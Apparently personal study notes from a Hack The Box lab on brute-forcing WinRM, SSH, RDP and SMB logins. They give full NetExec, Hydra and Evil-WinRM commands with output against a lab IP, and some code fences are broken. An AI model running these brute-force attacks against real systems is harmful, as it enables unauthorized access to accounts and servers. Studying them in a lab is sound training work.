Let's say we want to administer a Windows server over the network, the most common services that allow us to do this are:
- RDP
- WinRM
- SSH

All the services mentioned above have a authentication mechanism using a username and password. 

## WinRM

Installing NetExec: 
```shell-session
realCustampin@htb[/htb]$ sudo apt-get -y install netexec
```

We can run the help menu with passing the -h argument: 
```shell-session
realCustampin@htb[/htb]$ netexec -h

usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--verbose] [--debug] [--no-progress] [--log LOG] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
               [--dns-timeout DNS_TIMEOUT]
               {nfs,ftp,ssh,winrm,smb,wmi,rdp,mssql,ldap,vnc} ...

                   [--no-encode]
                   target [target ...]

positional arguments:
  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus file(s)

<SNIP>
```

**NetExec General Usage:**
```shell-session
realCustampin@htb[/htb]$ netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

Let's look at attacking a WinRM target:
```shell-session
realCustampin@htb[/htb]$ netexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```
- The (Pwn3d!) is a sign that we can most likely execute system commands if we log in with the brute-forced user. 

**Evil-WinRM**

Installing Evil-WinRM: 
```shell-session
realCustampin@htb[/htb]$ sudo gem install evil-winrm

Evil-WinRM Usage: 
```shell-session
realCustampin@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
```

```shell-session
realCustampin@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\user\Documents>
```
We are able to establish a session with the user and password arguments. 

## SSH

In order for us to brute force SSH, we can use a program called Hydra. 

```shell-session
realCustampin@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:03:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://10.129.42.197:22/
[22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```
- You can see that we provided hydra with the Username, Password, and Target IP in the form of 'ssh://TARGET_IP'

Using the Username and Password we just obtained, we can now login to SSH normally
```shell-session
realCustampin@htb[/htb]$ ssh user@10.129.42.197

The authenticity of host '10.129.42.197 (10.129.42.197)' can't be established.
ECDSA key fingerprint is SHA256:MEuKMmfGSRuv2Hq+e90MZzhe4lHhwUEo4vWHOUSv7Us.


Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '10.129.42.197' (ECDSA) to the list of known hosts.


user@10.129.42.197's password: ********

Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

user@WINSRV C:\Users\user>
```

## Remote Desktop Protocol (RDP)

Operates over TCP 3389 by default

We again can use Hydra to brute force these credentials: 
```shell-session
realCustampin@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:05:40
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 25 login tries (l:5/p:5), ~7 tries per task
[DATA] attacking rdp://10.129.42.197:3389/
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: mrb3n password: rockstar, continuing attacking the account.
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: cry0l1t3 password: delta, continuing attacking the account.
[3389][rdp] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```
- Same format as SSH however instead of typing SSH at the beginning of the address, we are typing rdp. 

Once credentials have been obtained, we then can use xFreeRDP to log in. 
```bash
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

## Hydra-SMB

Server Message Block is used to transfer data between client and server in LANs. 

Hydra Brute Forcing: 
```shell-session
realCustampin@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:37:31
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[445][smb] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid passwords found
```

Hydra may not be able to be used against SMBv3 replies. In order to work around this problem, we want to use Metasploit. 
```shell-session
realCustampin@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] attacking smb://10.129.42.197:445/
[ERROR] invalid reply from target smb://10.129.42.197:445/
```

Using Metasploit to gain user and pass credentials: 
```shell-session

**Smbclient:**
- Smbclient is a tool that is utilized to interact with the shares after you authenticate: 

```shell-session
realCustampin@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME

Enter WORKGROUP\user's password: *******
